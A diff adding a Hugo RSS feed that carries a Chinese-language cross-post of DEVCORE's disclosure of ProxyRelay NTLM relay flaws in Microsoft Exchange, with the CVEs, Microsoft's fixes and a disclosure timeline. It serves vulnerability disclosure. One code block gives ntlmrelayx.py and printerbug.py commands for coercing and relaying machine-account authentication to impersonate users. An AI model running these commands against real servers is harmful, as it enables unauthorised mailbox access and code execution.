@@ -1,0 +1,80 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Exchange攻击 on 办公AI智能小助手</title>
+        <link>http://localhost:1313/tags/exchange%E6%94%BB%E5%87%BB/</link>
+        <description>Recent content in Exchange攻击 on 办公AI智能小助手</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <copyright>qife</copyright>
+        <lastBuildDate>Sat, 02 Aug 2025 21:26:58 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/exchange%E6%94%BB%E5%87%BB/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>MS Exchange新攻击面分析第四部：ProxyRelay技术揭秘</title>
+        <link>http://localhost:1313/p/ms-exchange%E6%96%B0%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%E7%AC%AC%E5%9B%9B%E9%83%A8proxyrelay%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/</link>
+        <pubDate>Sat, 02 Aug 2025 21:26:58 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/ms-exchange%E6%96%B0%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%E7%AC%AC%E5%9B%9B%E9%83%A8proxyrelay%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/</guid>
+        <description>&lt;h1 id=&#34;ms-exchange新攻击面分析第四部proxyrelay&#34;&gt;MS Exchange新攻击面分析第四部：ProxyRelay！
+&lt;/h1&gt;&lt;p&gt;这是来自DEVCORE的交叉发布博客。完整系列包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;MS Exchange新攻击面分析第一部：ProxyLogon！&lt;/li&gt;
+&lt;li&gt;MS Exchange新攻击面分析第二部：ProxyOracle！&lt;/li&gt;
+&lt;li&gt;MS Exchange新攻击面分析第三部：ProxyShell！&lt;/li&gt;
+&lt;li&gt;MS Exchange新攻击面分析第四部：ProxyRelay！&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;背景说明&#34;&gt;背景说明
+&lt;/h2&gt;&lt;p&gt;这篇迟来的文章原本可以更早发布（原始漏洞于2021年6月报告给MSRC，遵循90天公开披露政策）。在与MSRC沟通期间，他们解释由于这是架构设计问题，需要进行大量代码修改和测试，因此希望通过累积更新(CU)而非常规补丁周二一次性解决。我们理解这一情况并同意延长截止日期。&lt;/p&gt;
+&lt;p&gt;微软最终于2022年4月20日发布Exchange Server 2019 CU 12和Exchange Server 2016 CU 23，但该补丁默认未启用。直到2022年8月9日微软才发布补丁激活方法。我们本有机会在Pwn2Own Vancouver 2021展示攻击，但出于安全研究初衷放弃了参赛计划。&lt;/p&gt;
+&lt;h2 id=&#34;技术原理&#34;&gt;技术原理
+&lt;/h2&gt;&lt;p&gt;自2021年4月微软封堵Proxy系列攻击后，我们一直在探索绕过方案。当时微软通过增强CAS前端认证机制，要求所有需要Kerberos票据的HTTP请求必须先通过认证，有效阻止了未经认证的请求访问CAS后端。但Exchange真的安全了吗？&lt;/p&gt;
+&lt;p&gt;我们借鉴了打印机漏洞(Printer Bug)的思路：在Exchange架构中，后端通过检查登录身份是否拥有ms-Exch-EPI-Token-Serialization扩展权限来授权HTTP请求。由于Exchange服务器在安装时会自动加入Exchange Servers组，该组所有对象默认拥有此权限。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用
+&lt;/h2&gt;&lt;p&gt;我们发现了完整的攻击面而非单个漏洞，由此衍生出多个CVE：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CVE-2021-33768 - 中继到Exchange前端&lt;/li&gt;
+&lt;li&gt;CVE-2022-21979 - 中继到Exchange后端&lt;/li&gt;
+&lt;li&gt;CVE-2021-26414 - 中继到Exchange DCOM&lt;/li&gt;
+&lt;li&gt;CVE-2022-RESERVED - 中继到其他Exchange服务&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;第一轮中继到exchange前端&#34;&gt;第一轮：中继到Exchange前端
+&lt;/h3&gt;&lt;p&gt;通过强制EX01发起SMB连接，使用ntlmrelayx.py将NTLM认证中继到EX02前端的EWS服务。由于中继身份是拥有Token-Serialization权限的机器账户，我们可以模拟任意用户：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 终端1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ python ntlmrelayx.py -smb2support -t https://EX02/EWS/Exchange.asmx
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 终端2 &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ python printerbug.py EX01 ATTACKER
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;微软通过在前端代理处理程序添加IsSystemOrMachineAccount()检查来修复此问题（CVE-2021-33768）。&lt;/p&gt;
+&lt;h3 id=&#34;第二轮中继到exchange后端&#34;&gt;第二轮：中继到Exchange后端
+&lt;/h3&gt;&lt;p&gt;后端验证更为复杂，我们展示了三种攻击方式：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;攻击后端/EWS：只需将目标端口从443改为444&lt;/li&gt;
+&lt;li&gt;攻击后端/RPC：通过RPC-over-HTTP协议操作邮箱&lt;/li&gt;
+&lt;li&gt;攻击后端/PowerShell：实现类似ProxyShell的利用链&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;微软通过强制启用IIS的扩展保护认证修复此问题（CVE-2022-21979）。&lt;/p&gt;
+&lt;h3 id=&#34;第三轮中继到windows-dcom&#34;&gt;第三轮：中继到Windows DCOM
+&lt;/h3&gt;&lt;p&gt;基于Exchange服务器在AD环境中的组继承特性，EX01$机器账户也是EX02的本地管理员。通过中继到MS-DCOM可以实现RCE。微软分三个阶段逐步修复此问题（CVE-2021-26414）。&lt;/p&gt;
+&lt;h2 id=&#34;时间线&#34;&gt;时间线
+&lt;/h2&gt;&lt;p&gt;详细披露过程包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;2021年6月2日：通过MSRC门户报告漏洞&lt;/li&gt;
+&lt;li&gt;2022年4月20日：发布Exchange补丁&lt;/li&gt;
+&lt;li&gt;2022年8月18日：最终发布CVE和补丁激活文档&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;结语&#34;&gt;结语
+&lt;/h2&gt;&lt;p&gt;这个系列研究历时两年，期间经历了漏洞碰撞、Pwn2Own竞赛、顶级会议演讲等事件。我们始终秉持安全研究的初心，希望通过这些发现帮助提升Exchange服务器的安全性。&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
